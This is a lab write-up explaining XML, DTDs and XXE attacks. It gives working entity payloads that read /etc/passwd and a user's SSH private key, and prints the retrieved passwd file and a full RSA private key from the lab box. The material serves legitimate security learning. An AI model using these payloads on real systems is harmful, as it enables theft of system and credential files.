# XML External Entity

**Date:** 29, December, 2020

**Author:** Dhilip Sanjay S

---

## What is XML?
- eXtensible Markup Language - defines a set of rules for encoding documents in a format that is both human and machine readable.
- It is a markup language used for storing and transporting data.

## Why use XML?
- Platform and programming language independent.
- Data can be changed at any point in time without affecting the data presentation.
- XML allows validation using DTD (Document Type Definition) and Schema.

## Syntax
- XML Prolog is used to specify XML version and encoding in XML document:
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    ```
    
- XML document must contain a root element. If ther is no root element, then it would be considered wrong or invalid XML doc:
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <mail>
        <to>falcon</to>
        <from>feast</from>
        <subject>About XXE</subject>
        <text>Teach about XXE</text>
    </mail>
    ```

    - `mail` -  root element
    - `to`, `from`, `text` - children element

- XML is **case-sensitive** language.
- XML elements can have attributes (similar to HTML):
    ```xml
    <text category = "message">You need to learn about XXE</text>
    ```

    - `category` - attribute
    - `message` - attribute value

---
## XML External Entity - DTD (Document Type Definition)
- DTD defines the structure and the legal elements and attributes of an XML document.
- **P.S:** HTML has pre-defined tags and attributes, whereas in XML, we define the elements and attributes using DTD.
- Internal and External DTD declaration.

- note.dtd
    ```xml
    <!DOCTYPE note [ 
    <!ELEMENT note (to,from,heading,body)> 
    <!ELEMENT to (#PCDATA)> 
    <!ELEMENT from (#PCDATA)> 
    <!ELEMENT heading (#PCDATA)> 
    <!ELEMENT body (#PCDATA)> ]>
    ```
- XML document that uses note.dtd
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE note SYSTEM "note.dtd">
    <note>
        <to>falcon</to>
        <from>feast</from>
        <heading>hacking</heading>
        <body>XXE attack</body>
    </note>    
    ```
- Understanding how DTD validates the XML:
    - `!DOCTYPE note` - deines a root element of the document named **note**.
    - `!ELEMENT note` - defines that note element must contain the elements : "to, from, heading, body".
    - `!ELEMENT to (#PCDATA)` - defines to element to be of type **#PCDATA**
    - `!ELEMENT from (#PCDATA)` - defines to element from be of type **#PCDATA**
    - `!ELEMENT heading (#PCDATA)` - defines to element heading be of type **#PCDATA**
    - `!ELEMENT body (#PCDATA)` - defines to element body be of type **#PCDATA**
- **Note:** `#PCDATA` - Parseable Character Data.

### Entities
- Entities in DTD
    ```xml
    <!ENTITY entity-name "entity-value">
    ```
- Entity usage in XML
    ```xml
    <author>&entity-name;</author>
    ```
### External Entities
- External entity in DTD
    ```xml
    <!ENTITY entity-name SYSTEM "URI/URL">
    ```
--- 

## XXE Attack
- XXE attack is a vulnerability that absuses features of XML parsers/data.
    - Denial of Service
    - Server-Side Request Forgery
    - Enable port scanning
    - Remote code Execution

- Two types of XXE attacks
    - **In-band XXE:** Attacker can receive an immediate response to the XXE payload.
    - **Out-of-band XXE (Blind XXE):** No immediate response from the web application. Attacker has to reflect the output of their XXE payload to some other file or their own server.

## XXE Payload

- To verify that XML is parsed:
    ```xml
    <!DOCTYPE replace [<!ENTITY name "feast"> ]>
    <userInfo>
    <firstName>falcon</firstName>
    <lastName>&name;</lastName>
    </userInfo>
    ```

- XXE to read some file from the system by suing ENTITY and SYSTEM keywords:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
    <root>&read;</root>
    ```
---

## XXE Exploiting

### Try to display your own name using any payload.
    ```xml
     <!DOCTYPE replace [<!ENTITY name "Sanjay"> ]>
    <userInfo>
    <firstName>Dhilip</firstName>
    <lastName>&name;</lastName>
    </userInfo>
    ```   
---

### See if you can read the /etc/passwd
- **Answer:** 
    ```bash
    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash 
    ```
- **Steps to Reproduce:** 
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
    <root>&read;</root>
    ```
---

### What is the name of the user in /etc/passwd
- **Answer:** falcon

---

### Where is falcon's SSH key located?
- **Answer:** /home/falcon/.ssh/id_rsa
- Usually the ssh keys are stored in `id_rsa` file of the respective user's `.ssh` folder by default.

---

### What are the first 18 characters for falcon's private keys
- **Answer:** MIIEogIBAAKCAQEA7b
- **Steps to Reproduce:** 
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE ssh [<!ENTITY key SYSTEM "file:/home/falcon/.ssh/id_rsa">]>
    <ssh>&key;</ssh>
    ```
    - **Output:**
    ```bash
    -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzKc81OibYfCGhA24RYmcterVvRvdxw0IVSC lZ9oM4LiwzqRIEbed7/hAA0wu6Tlyy+oLHZn2i3pLur07pxb0bfYkr7r5DaKpRPB 2Echy67MiXAQu/xgHd1e7tST18B+Ubnwo4YZNxQa+vhHRx4G5NLRL8sT+Vj9atKN MfJmbzClgOKpTNgBaAkzY5ueWww9g0CkCldOBCM38nkEwLJAzCKtaHSreXFNN2hQ IGfizQYRDWH1EyDbaPmvZmy0lEELfMR18wjYF1VBTAl8PNCcqVVDaKaIrbnshQpO HoqIKrf3wLn4rnU9873C3JKzX1aDP6q+P+9BlwIDAQABAoIBABnNP5GAciJ51KwD RUeflyx+JJIBmoM5jTi/sagBZauu0vWfH4EvyPZ2SThZPfEb3/9tQvVneReUoSA5 bu5Md58Vho6CD81qCQktBAOBV0bwqIGcMFjR95gMw8RS9m4AyUnUgf438kfja5Jh NP36ivgQZZFBqzLLzoG9Y9jlGKjiSyMvW4u63ZacCKPTpp5P53794/UVU7JiM03y OvavZ2QveJp5BndV5lOkcIEFwFRACDK1xwzDRzx/TNJLufztb2EheMc3stNuOMea TLKlbG0Mp/c2az8vNN6HA0QiwxYlKZ58RfdsOfbsFxAltYNnzxy9UEieXtrWVg7X Qfi/ZeECgYEA/pfgg6BClEmipXv8hVkLWe7VwlFf4RXnxfWyi6OqC/3Yt9Q9B4Ya 6bgLzk2vPNHgJt+g2yh/TzMX6sCC9IMYedc0faiJr/VISBm25qTjqIGctwt0D3nb j60mSKKFbwDPxrcek/7WH1cWDcaLTDdL9KPLk1JQzbwDzojrE1TDD+cCgYEA7wsA MPm4aUDikZHKhQ5OOge+wzPNXVR6Yy1VV3WZfxRCoEuq6fYEJsKB5tykfQPC8cUn qwGvo8TiMHbQ9KmI5FabfBK8LswQ575bnLtMxdPyBCgYqlsAIkPYQAOizUVlrOOg faKF5VknsONM9DC3ZNx5L1zQXbsIrWbEPsRlytECgYB7CXr/IZwLfeqUfu7yoq3R sJKtbhYf+S4hhTPcOCQd13e8n10/HZg0CzXpZbGieusQ3lIml9Ouusp8ML0Y3aIe f9pmP+UKnEdqUMMLg/RhowHRlD9qm0F4lf1CbQh/NK01I5ore6SPUM7fqWv4UWDr wZzIfad/RbWxQooYtYXvUQKBgFDLcBIdpYX1x16aX1AfqLMWgRSrQqNj9UXmQa0g 83OvXmGdkbQoUfjjz1I/i10x00cycxjqpfn9htIIptG7J6i92SnTj0Vl9eTOQ1qz N9y5qVhcURHrVh0+vy3LzNACv73y5gDw2L7PJoo0GYODn8j4eAFZJpg3qlQpovTw HtOxAoGABqwywFKFNTYgrl17Rs4g3H1nc0EhOzGetRaRL2bcvQsZevuWyswp0Mbm 9nlgNAtxttsmfL+OU7nP3I4YQlyZed4luRWcRaXrvGMqfEL4wzRez5ZxMnZM/IlQ 9DBlD9C7t5MI3aXR3A5zFVVINomwHH7aGfeha1JRXXAtasLTVvA= -----END RSA PRIVATE KEY----- 
    ```
    - Put it inside a file and then use head command to get the first 18 characters: `head -c 18 <FILE>`
---
    